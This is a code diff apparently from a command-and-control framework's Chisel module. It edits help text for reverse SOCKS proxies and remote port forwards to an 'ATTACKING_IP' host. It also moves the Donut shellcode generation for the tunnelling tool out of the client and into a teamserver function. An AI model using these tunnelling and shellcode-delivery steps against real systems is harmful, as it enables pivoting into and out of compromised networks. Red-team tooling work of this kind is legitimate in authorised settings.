@@ -58,14 +58,31 @@ std::string Chisel::getInfo()
     info += "- chisel status\n";
     info += "- chisel stop pid\n";
     info += "Reverse Socks Proxy:\n";
-    info += "- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:socks\n";
+    info += "- chisel client ATTACKING_IP:LISTEN_PORT R:socks\n";
     info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
     info += "Remote Port Forward:\n";
-    info += "- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT\n";
+    info += "- chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT\n";
     info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
 #endif
     return info;
 }
+
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
+int Chisel::initPreparedShellcode(const ModulePreparedShellcodeTask& task, C2Message& c2Message)
+{
+    if (task.payload.empty())
+    {
+        c2Message.set_returnvalue("Shellcode payload is empty.");
+        return -1;
+    }
+
+    c2Message.set_instruction(std::string(moduleName));
+    c2Message.set_inputfile(task.inputFile);
+    c2Message.set_cmd(task.displayCommand);
+    c2Message.set_data(task.payload.data(), task.payload.size());
+    return 0;
+}
+#endif
 
 int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
@@ -117,59 +134,10 @@ int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
             return -1;
         }
     }
-    else if (splitedCmd.size() == 5)
+    else if (splitedCmd.size() >= 2)
     {
-        std::string inputFile=splitedCmd[1];
-        std::string args;
-
-        for (int idx = 2; idx < splitedCmd.size(); idx++) 
-        {
-            if(!args.empty())
-                args+=" ";
-            args+=splitedCmd[idx];
-        }
-
-        if(inputFile.empty())
-        {
-            std::string msg = "A file name have to be provided.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-
-        std::ifstream myfile;
-        myfile.open(inputFile);
-
-        if(!myfile)
-        {
-            std::string newInputFile=m_toolsDirectoryPath;
-            newInputFile+=inputFile;
-            myfile.open(newInputFile, std::ios::binary);
-            inputFile=newInputFile;
-        }
-
-        if(!myfile) 
-        {
-            std::string msg = "Couldn't open file.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-        myfile.close();
-
-        std::string method;
-        std::string payload;
-        creatShellCodeDonut(inputFile, method, args, payload, true, false, m_windowsArch);
-
-        if(payload.size()==0)
-        {
-            std::string msg = "Something went wrong. Payload empty.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-
-        c2Message.set_instruction(splitedCmd[0]);
-        c2Message.set_inputfile(inputFile);
-        c2Message.set_cmd(args);
-        c2Message.set_data(payload.data(), payload.size());
+        c2Message.set_returnvalue("Chisel start tasks are prepared by the TeamServer shellcode service.\n");
+        return -1;
     }
     else
     {
